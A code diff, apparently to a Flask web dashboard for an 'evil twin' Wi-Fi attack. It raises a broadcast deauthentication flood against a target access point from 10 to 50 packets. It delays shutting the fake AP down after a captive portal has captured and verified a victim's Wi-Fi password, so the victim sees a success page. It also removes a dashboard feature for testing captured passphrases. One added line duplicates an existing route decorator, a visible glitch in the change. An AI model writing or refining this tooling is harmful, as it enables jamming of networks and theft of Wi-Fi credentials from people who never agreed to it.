@@ -4486,7 +4486,7 @@ def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk=''):
 
     try:
         proc = subprocess.Popen(
-            deauth_command(bssid, 'FF:FF:FF:FF:FF:FF', channel, 10, continuous=True),
+            deauth_command(bssid, 'FF:FF:FF:FF:FF:FF', channel, 50, continuous=True),
             stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
             start_new_session=True)
     except OSError as exc:
@@ -4691,7 +4691,10 @@ def portal_submit():
                 'at': datetime.datetime.now().isoformat(timespec='seconds'),
             })
             audit('Portal: Wi-Fi password verified for %s (%s)' % (ssid, client_mac), 'warn')
-            _evil_twin_shutdown()
+            # Answer the phone first, then tear the twin down: killing the AP
+            # before the response is flushed makes the browser keep the old
+            # "incorrect password" page, which looks like a rejection.
+            threading.Timer(2.0, _evil_twin_shutdown).start()
             return Response(PORTAL_OK_HTML, mimetype='text/html')
         if check.get('result') == 'invalid':
             audit('Portal: rejected Wi-Fi password for %s (%s)' % (ssid, client_mac), 'warn')
@@ -4769,38 +4772,7 @@ def api_creds_delete():
     return jsonify({'ok': True, 'count': len(entries)})
 
 
-@app.route('/api/evil-twin/check-psk', methods=['POST'])
-@require_auth
-def api_evil_twin_check_psk():
-    """Verify a passphrase from the dashboard, without the phone/portal."""
-    data = request.json or {}
-    psk = str(data.get('psk', '')).strip()
-    if not (8 <= len(psk.encode('utf-8', 'ignore')) <= 63):
-        return jsonify({'ok': False, 'result': 'error',
-                        'error': 'the passphrase must be 8-63 characters'})
-    info = _evil_twin_info[0] or read_json_file(EVILTWIN_STATE, {})
-    ssid = str(data.get('ssid') or info.get('ssid') or '').strip()
-    bssid = str(data.get('bssid') or info.get('bssid') or '').strip()
-    channel = data.get('channel') or info.get('channel') or 6
-    if not ssid or not bssid:
-        return jsonify({'ok': False, 'result': 'error',
-                        'error': 'pick a target first (or use the running twin)'})
-    check = validate_psk_with_ap(psk, ssid=ssid, bssid=bssid, channel=channel)
-    log_portal_attempt(ssid, 'dashboard-test', psk,
-                       check.get('result', '?'), check.get('detail', ''))
-    if check.get('result') == 'ok':
-        _log_credential('-', 'dashboard-test', 'wifi-psk',
-                        {'ssid': ssid, 'bssid': bssid, 'password': psk,
-                         'verified': 'yes'})
-        remember_last_psk({'ssid': ssid, 'bssid': bssid, 'password': psk,
-                           'verified': 'yes', 'client_mac': 'dashboard-test',
-                           'at': datetime.datetime.now().isoformat(timespec='seconds')})
-        audit('Wi-Fi password verified from the dashboard for %s' % ssid, 'warn')
-        return jsonify({'ok': True, 'result': 'ok', 'detail': check.get('detail', '')})
-    return jsonify({'ok': False, 'result': check.get('result', 'error'),
-                    'error': check.get('detail', 'verification failed')})
-
-
+@app.route('/wlan1')
 @app.route('/wlan1')
 @require_auth
 def wlan1_page():
@@ -5055,14 +5027,6 @@ def wlan1_page():
         <label>WPA2 passphrase (optional)</label>
         <input id="et-psk" placeholder="Empty = open twin" autocomplete="off">
       </div>
-    </div>
-    <div class="fg" style="margin-top:4px">
-      <label>Test a password (associates to the real AP, no phone needed)</label>
-      <div style="display:flex;gap:8px;flex-wrap:wrap">
-        <input id="et-test-psk" placeholder="Wi-Fi password to verify" autocomplete="off" style="flex:1;min-width:180px">
-        <button class="btn btn-outline" onclick="testTargetPsk(this)">Test</button>
-      </div>
-      <div id="et-test-result" class="hint" style="margin:8px 0 0"></div>
     </div>
     <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
       <button class="btn btn-danger" onclick="startEvilTwin()" id="et-start">Start Evil Twin</button>
@@ -5721,29 +5685,6 @@ async function forgetLastPsk(){
   const r = await api('/api/evil-twin/last-psk/delete','POST',{});
   if(r && r.ok){ toast('Captured password cleared','success'); refreshEvilTwinStatus(); }
   else { toast('Delete failed: '+((r&&r.error)||'unknown'),'error',6000); }
-}
-
-async function testTargetPsk(btn){
-  const psk = (document.getElementById('et-test-psk').value || document.getElementById('et-psk').value || '').trim();
-  const ssid = document.getElementById('et-ssid').value.trim();
-  const bssid = document.getElementById('et-bssid').value.trim();
-  const channel = document.getElementById('et-channel').value;
-  const out = document.getElementById('et-test-result');
-  if(!psk || psk.length < 8){ toast('Enter the password to test.', 'warn'); return; }
-  if(!ssid || !bssid){ toast('Pick a target network first.', 'warn'); return; }
-  busy(btn, true, 'Testing...');
-  if(out){ out.textContent = 'Associating to the real AP, this takes 10-20 seconds...'; out.style.color = 'var(--dim)'; }
-  const r = await api('/api/evil-twin/check-psk','POST',{psk:psk, ssid:ssid, bssid:bssid, channel:channel});
-  busy(btn, false);
-  if(r && r.result === 'ok'){
-    if(out){ out.textContent = 'Correct: the AP accepted this password.'; out.style.color = 'var(--grn)'; }
-    toast('Password verified and saved', 'success');
-    refreshEvilTwinStatus();
-  } else if(r && r.result === 'invalid'){
-    if(out){ out.textContent = 'Wrong: the AP rejected this password.'; out.style.color = 'var(--red)'; }
-  } else {
-    if(out){ out.textContent = 'Could not verify: ' + ((r && (r.error || r.detail)) || 'unknown'); out.style.color = 'var(--warn)'; }
-  }
 }
 
 async function startEvilTwin(){
